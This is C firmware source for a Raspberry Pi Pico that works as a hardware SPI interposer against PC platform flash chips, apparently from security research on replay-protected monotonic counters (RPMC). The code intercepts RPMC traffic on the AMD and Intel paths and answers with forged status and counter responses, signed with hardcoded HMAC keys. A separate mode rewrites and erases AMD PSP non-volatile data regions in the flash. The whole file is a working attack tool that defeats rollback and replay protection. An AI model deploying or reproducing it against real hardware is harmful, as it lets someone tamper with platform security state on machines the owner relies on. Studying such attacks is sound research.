#include <pico/stdlib.h>
#include <pico/binary_info.h>
#include <pico/multicore.h>
#include <hardware/spi.h>
#include <mbedtls/md.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "spi_sniff.pio.h"
#include "rpmc_sniffer.pio.h"
#include "psp_nvdata.h"


#define PIN_N_MUX_EN 16
bi_decl(bi_1pin_with_name(PIN_N_MUX_EN, "#MUX enable"));
#define PIN_MUX_INTERPOSE 18

#define PIN_N_LLS_OE 17

#define PIN_LLS_1DIR 22
#define PIN_LLS_2DIR 19

#define CAPTURE_SPI spi0
#define MASTER_SPI CAPTURE_SPI
#define PIN_CHIP_SPI_CLK 2
#define PIN_CHIP_MASTER_SPI_RX 3
#define PIN_CHIP_MASTER_SPI_TX 4
#define PIN_CHIP_SPI_CS 5
#define PIN_CHIP_SPI_READ_RX 0

#define OUTPUT_SPI spi1
#define PIN_PICO_BOARD_SPI_CLK 10
#define PIN_PICO_BOARD_SPI_TX 11
#define PIN_PICO_BOARD_SPI_RX 12
#define PIN_PICO_BOARD_SPI_CS 13

#define HMAC_KEY_SIZE 32

struct __attribute((__packed__)) rpmc_status_msg {
    uint8_t im_too_lazy_dummy;
    uint8_t dummy[2];
    uint8_t status;
	uint8_t tag[12];
	uint32_t counter_data;
	uint8_t signature[32];
};

union rpmc_full_status {
    struct rpmc_status_msg msg;
    uint32_t words[(sizeof(struct rpmc_status_msg) + 3) / 4]; // for easier transfer via fifo
};

void error(const char * msg)
{
    while (true) {
        puts(msg);
        sleep_ms(500);
    }
}

inline uint32_t reverse(const uint32_t x)
{
    return ((x & UINT32_C(0x0000'00FF)) << 24) |
           ((x & UINT32_C(0x0000'FF00)) <<  8) |
           ((x & UINT32_C(0x00FF'0000)) >>  8) |
           ((x & UINT32_C(0xFF00'0000)) >> 24); 
}

static inline void __time_critical_func(interpose_no_push)()
{
    gpio_set_mask((1 << PIN_MUX_INTERPOSE) | (1 << PIN_LLS_1DIR));
}

static inline void __time_critical_func(interpose)()
{
    interpose_no_push();
    multicore_fifo_push_blocking(132);
}

static inline void __time_critical_func(stop_interpose)()
{
    gpio_clr_mask((1 << PIN_MUX_INTERPOSE) | (1 << PIN_LLS_1DIR));
}

void __time_critical_func(rpmc_interpose_increment_core1)(void)
{
    const static uint8_t status[] = {0xff, // to finish the rpmc transmission
                                     0xff, 0x00,
                                     0xff, 0x00,
                                     0xff, 0xff, 0x80,
                                     0xff, 0x00};
    const static size_t status_length[] = {1, 2, 2, 3, 2};
    while (true) {
        multicore_fifo_pop_blocking();

        const uint8_t * status_pos = status;
        
        for (size_t counter = 0; counter < count_of(status_length); counter++) {
            spi_write_blocking(OUTPUT_SPI, status_pos, status_length[counter]);
            status_pos += status_length[counter];
        }

        stop_interpose();
    }
}

static uint32_t counter_values[4] = {0, 0, 0, 0};
const static uint8_t hmac_keys[4 * HMAC_KEY_SIZE] = {
    // Key slot 0
    0xc8, 0x63, 0x76, 0x1d, 0x3e, 0xbe, 0xc4, 0x71,
    0x6b, 0xe8, 0x13, 0x56, 0x9b, 0x22, 0xa3, 0xab,
    0xbf, 0x30, 0xd3, 0x6e, 0x49, 0x1e, 0x58, 0x21,
    0x2f, 0x1d, 0x3d, 0x56, 0x31, 0xa7, 0x2e, 0x0a,
    // Key slot 1
    0x1b, 0x57, 0xbe, 0x73, 0xb7, 0x48, 0xed, 0xc6,
    0x77, 0x02, 0xfb, 0xa0, 0x7b, 0xfb, 0xb2, 0x69,
    0xc7, 0x36, 0xe8, 0xc2, 0x95, 0x35, 0x4a, 0x98,
    0x8b, 0xc5, 0xff, 0x5a, 0xe7, 0x4c, 0x20, 0x89,
    // Key slot 2
    0x84, 0x35, 0xd3, 0xff, 0x92, 0x04, 0x75, 0xb4,
    0xb1, 0xc9, 0x4f, 0x21, 0x9c, 0x62, 0xa3, 0x54,
    0xea, 0x3a, 0x02, 0x9d, 0x2c, 0x30, 0xaa, 0xaa,
    0x2d, 0x25, 0x1e, 0x93, 0x74, 0x3e, 0x72, 0x9a,
    // Key slot 3
    0x4c, 0xfd, 0x6b, 0x7f, 0xbb, 0x05, 0xa6, 0xb4,
    0x6d, 0xf2, 0x35, 0x03, 0xb2, 0x30, 0x2d, 0xa9,
    0xfb, 0x59, 0xe7, 0x58, 0x2b, 0xa4, 0x2d, 0x5d,
    0x03, 0x74, 0x03, 0x92, 0x3e, 0x2f, 0xeb, 0x28
};

const static uint32_t wait_msg[] = {0xaaaaad00};
const static uint32_t done_msg[13] = {0xabcde000, [1 ...12] = 0xdeadbeef};

void interpose_intel()
{
    while (true) {
        struct rpmc_command_info info;

        rpmc_interpose(&info);
        trigger_get(interpose_no_push);

        //printf("Received RPMC command %i to %i\n", info.kind, info.target_counter);

        union rpmc_full_status response;
        response.msg.dummy[0] = 0xff;
        response.msg.dummy[1] = 0xff;
        response.msg.status = 0x80;
        
        if (info.kind == INCREMENT) {
            counter_values[info.target_counter]++;
        } else if (info.kind == GET) {
            response.msg.counter_data = reverse(counter_values[info.target_counter]);
            mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                            hmac_keys + HMAC_KEY_SIZE * info.target_counter,
                            HMAC_KEY_SIZE,
                            response.msg.tag,
                            12 + 4,
                            response.msg.signature);
        } else if (info.kind == UPDATE_HMAC_KEY) {
            // status short
#if 0
            if (interposer_send(done_msg, 4) != 8) {
                printf("Error: status short failed somehow.\n");
            }
            if (interposer_send(done_msg, sizeof(done_msg)) != 8) {
                printf("Error: status long failed somehow.\n");
            }
#endif
            interposer_send(done_msg, 4);
            interposer_send(done_msg, sizeof(done_msg));
            //printf("status short and long sent!\n");
            interposer_stop();
            continue;
        }

        for (size_t i = 0; i < count_of(response.words); i++)
            multicore_fifo_push_blocking(response.words[i]);
    }
}

void interpose_intel_core1()
{
    union rpmc_full_status response;
    size_t response_bytes_received = 0;

    while (true) {
        if (response_bytes_received < count_of(response.words)) {
            interposer_send(wait_msg, sizeof(wait_msg));
        } else {
            // This needs to be changed according to how the firmware reads out the counter value
            interposer_send(done_msg, sizeof(done_msg));
            interposer_send(response.words, sizeof(response.msg));
            stop_interpose();
            response_bytes_received = 0;
        }

        while (response_bytes_received < count_of(response.words) && multicore_fifo_pop_timeout_us(20, &response.words[response_bytes_received]))
            response_bytes_received++;
    }
}

#define FLASH_PAGE_SIZE         256
#define FLASH_SECTOR_SIZE       4096

static inline void cs_select(uint cs_pin) {
	asm volatile("nop \n nop \n nop"); // FIXME
	gpio_put(cs_pin, 0);
	asm volatile("nop \n nop \n nop"); // FIXME
}

static inline void cs_deselect(uint cs_pin) {
	asm volatile("nop \n nop \n nop"); // FIXME
	gpio_put(cs_pin, 1);
	asm volatile("nop \n nop \n nop"); // FIXME
}

uint8_t __time_critical_func(get_flash_status)(spi_inst_t *spi, uint cs_pin)
{
    cs_select(cs_pin);
    uint8_t cmd[] = {
        0x05, // Read Status Register
        0
    };
    uint8_t out[sizeof(cmd)];
    spi_write_read_blocking(spi, cmd, out, sizeof(cmd));
    cs_deselect(cs_pin);

    return out[1];
}

void __time_critical_func(flash_erase)(spi_inst_t *spi, uint cs_pin, uint32_t addr) {
	cs_select(cs_pin);
	const uint8_t cmdbuf[] = {
        0x21, // 4-byte addres sector erase
        addr >> 24,
        addr >> 16,
        addr >> 8,
        addr
    };

    spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
    //spi_read_blocking(spi, 0, buf, len);
    cs_deselect(cs_pin);
}

void __time_critical_func(flash_write)(spi_inst_t *spi, uint cs_pin, uint32_t addr, const uint8_t * buf, const size_t len) {
	cs_select(cs_pin);
	const uint8_t cmdbuf[] = {
		0x12, // 4-byte page program
        addr >> 24,
		addr >> 16,
		addr >> 8,
		addr
	};

	spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
	spi_write_blocking(spi, buf, len);
	cs_deselect(cs_pin);
}

void __time_critical_func(flash_write_enable)(spi_inst_t *spi, uint cs_pin) {
	cs_select(cs_pin);
	const uint8_t cmdbuf[] = {
		0x06, // flash write enable
	};

	spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
	cs_deselect(cs_pin);
}

void __time_critical_func(flash_wait_done)(spi_inst_t *spi, uint cs_pin) {
    while (get_flash_status(spi, cs_pin) != 0)
        sleep_us(100);
}

void write_segment(spi_inst_t * const out_spi, const unsigned int cs, const uint32_t base_addres, const size_t len , const uint8_t data[len])
{
    for (uint32_t offset = 0; offset < len; offset += FLASH_PAGE_SIZE) {
        const uint32_t target_addr = base_addres + offset;

        if(target_addr % FLASH_SECTOR_SIZE == 0){
            flash_write_enable(out_spi, cs);
            sleep_us(100);
            flash_erase(out_spi, cs, target_addr);
            sleep_us(100);
            flash_wait_done(out_spi, cs);
            printf("flash_erase: %x\n", target_addr);
        }

        flash_write_enable(out_spi, cs);
        sleep_us(100);
        flash_write(out_spi, cs, target_addr, data + offset, MIN(len - offset, FLASH_PAGE_SIZE));
        sleep_us(100);
        flash_wait_done(out_spi, cs);
        printf("flash_write: %x\n", target_addr);
    }
}

void reprogram_flash(spi_inst_t * const out_spi, const unsigned int cs)
{
    write_segment(out_spi, cs, 0x10e0000, sizeof(psp_nvdata_bin), psp_nvdata_bin);
    write_segment(out_spi, cs, 0x1100000, sizeof(psp_nvram_bin), psp_nvram_bin);
    write_segment(out_spi, cs, 0x1060000, sizeof(nvrom_state_bin), nvrom_state_bin);

    for (uint32_t start = 0x01102000; start  < 0x1100000 + 0x40000; start += FLASH_SECTOR_SIZE) {
        flash_write_enable(out_spi, cs);
        sleep_us(100);
        flash_erase(out_spi, cs, start);
        sleep_us(100);
        flash_wait_done(out_spi, cs);
        printf("flash_erase: %x\n", start);
    }
}

void init_mux()
{
    gpio_init(PIN_N_MUX_EN);
    gpio_put(PIN_N_MUX_EN, 0); // mux is active low
    gpio_set_dir(PIN_N_MUX_EN, GPIO_OUT);

    gpio_init(PIN_MUX_INTERPOSE);
    gpio_put(PIN_MUX_INTERPOSE, 0);
    gpio_set_dir(PIN_MUX_INTERPOSE, GPIO_OUT);
    gpio_set_slew_rate(PIN_MUX_INTERPOSE, GPIO_SLEW_RATE_FAST);
}

void init_lls(const bool lls1_dir, const bool lss2_dir)
{
    gpio_init(PIN_N_LLS_OE);
    gpio_put(PIN_N_LLS_OE, 0);
    gpio_set_dir(PIN_N_LLS_OE, GPIO_OUT);

    gpio_init(PIN_LLS_1DIR);
    gpio_put(PIN_LLS_1DIR, lls1_dir);
    gpio_set_dir(PIN_LLS_1DIR, GPIO_OUT);
    gpio_set_slew_rate(PIN_LLS_1DIR, GPIO_SLEW_RATE_FAST);

    gpio_init(PIN_LLS_2DIR);
    gpio_put(PIN_LLS_2DIR, lss2_dir);
    gpio_set_dir(PIN_LLS_2DIR, GPIO_OUT);
}

void init_spi0_master()
{
    spi_init(CAPTURE_SPI, 1 * 1000 * 1000);

    gpio_init(PIN_CHIP_SPI_CS);
    gpio_put(PIN_CHIP_SPI_CS, 1);
    gpio_set_dir(PIN_CHIP_SPI_CS, GPIO_OUT);

    gpio_set_function(PIN_CHIP_SPI_CLK, GPIO_FUNC_SPI);
    gpio_set_function(PIN_CHIP_MASTER_SPI_RX , GPIO_FUNC_SPI);
    gpio_set_function(PIN_CHIP_MASTER_SPI_TX , GPIO_FUNC_SPI);
}

void init_spi1_interposer()
{
    spi_init(OUTPUT_SPI, 25 * 1000 * 1000);
    spi_set_slave(OUTPUT_SPI, true);
    // The spi set format function seems not work as specified in the documentation
    spi_set_format(OUTPUT_SPI, 24, 0, 1, 1);

    gpio_set_function(PIN_PICO_BOARD_SPI_CLK, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_BOARD_SPI_CS, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_BOARD_SPI_TX, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_BOARD_SPI_RX, GPIO_FUNC_SPI);
}

int main()
{
    stdio_init_all();
    // TODO: write loop um die flash region zu overwriten
    goto i;
    switch (getchar()) {
        // interpose amd 
        case 'a':
            init_mux();
            init_lls(0, 0);
            // initlialize spi trigger
            spi_sniff_init(PIN_CHIP_SPI_CS, PIN_CHIP_SPI_CLK, PIN_CHIP_MASTER_SPI_RX);
            init_spi1_interposer();
            printf("Interposing AMD\n");

            multicore_launch_core1(rpmc_interpose_increment_core1);
            spi_trigger(UINT16_C(0x9b02), interpose);
            break;
        case 'i':
        i:
            init_mux();
            init_lls(0, 0);
            rpmc_sniffer_init(PIN_CHIP_SPI_CS, PIN_CHIP_SPI_CLK, PIN_CHIP_MASTER_SPI_RX, PIN_MUX_INTERPOSE, PIN_LLS_1DIR);
            interposer_pio_init(PIN_PICO_BOARD_SPI_CS, PIN_PICO_BOARD_SPI_CLK, PIN_PICO_BOARD_SPI_TX);
            
            printf("Interposing Intel\n");
            //multicore_launch_core1(interpose_intel_core1);
            interpose_intel();
            break;
        case 'r':
            init_lls(1, 0);
            init_spi0_master();
            
            printf("Reprogramming flash sector\n");
            reprogram_flash(MASTER_SPI, PIN_CHIP_SPI_CS);
            break;
        default: // do nothing just leave chip directly connected
            init_mux();
            printf("Just passing traffic through\n");
            break;
    }

    while (true)
        tight_loop_contents();

    return 0;
}